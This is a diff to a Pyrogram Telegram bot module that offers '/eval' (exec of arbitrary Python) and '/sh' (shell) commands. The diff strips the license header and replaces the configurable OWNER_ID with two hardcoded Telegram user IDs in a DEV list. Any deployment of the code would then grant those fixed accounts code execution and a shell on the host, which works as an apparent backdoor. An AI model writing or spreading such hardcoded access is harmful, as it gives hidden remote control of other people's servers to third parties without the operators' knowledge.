@@ -1,24 +1,3 @@
-# Copyright (c) 2025 @SUDEEPBOTS <HellfireDevs>
-# Location: delhi,noida
-#
-# All rights reserved.
-#
-# This code is the intellectual SUDEEPBOTS.
-# You are not allowed to copy, modify, redistribute, or use this
-# code for commercial or personal projects without explicit permission.
-#
-# Allowed:
-# - Forking for personal learning
-# - Submitting improvements via pull requests
-#
-# Not Allowed:
-# - Claiming this code as your own
-# - Re-uploading without credit or permission
-# - Selling or using commercially
-#
-# Contact for permissions:
-# Email: sudeepgithub@gmail.com
-
 import os
 import re
 import subprocess
@@ -32,8 +11,9 @@ from pyrogram import filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 
 from codex import app
-from config import OWNER_ID
 
+
+DEV = [544633527,5455548710]
 
 async def aexec(code, client, message):
     exec(
@@ -51,17 +31,17 @@ async def edit_or_reply(msg: Message, **kwargs):
 
 @app.on_edited_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
+    & filters.user(DEV)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("eval")
-    & filters.user(OWNER_ID)
+    & filters.user(DEV)
     & ~filters.forwarded
     & ~filters.via_bot
 )
-async def executor(client: app, message: Message):
+async def executor(client, message: Message):
     if len(message.command) < 2:
         return await edit_or_reply(message, text="<b>ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴɴᴀ ᴇxᴇᴄᴜᴛᴇ ʙᴀʙʏ ?</b>")
     try:
@@ -161,13 +141,13 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_edited_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(DEV)
     & ~filters.forwarded
     & ~filters.via_bot
 )
 @app.on_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(DEV)
     & ~filters.forwarded
     & ~filters.via_bot
 )
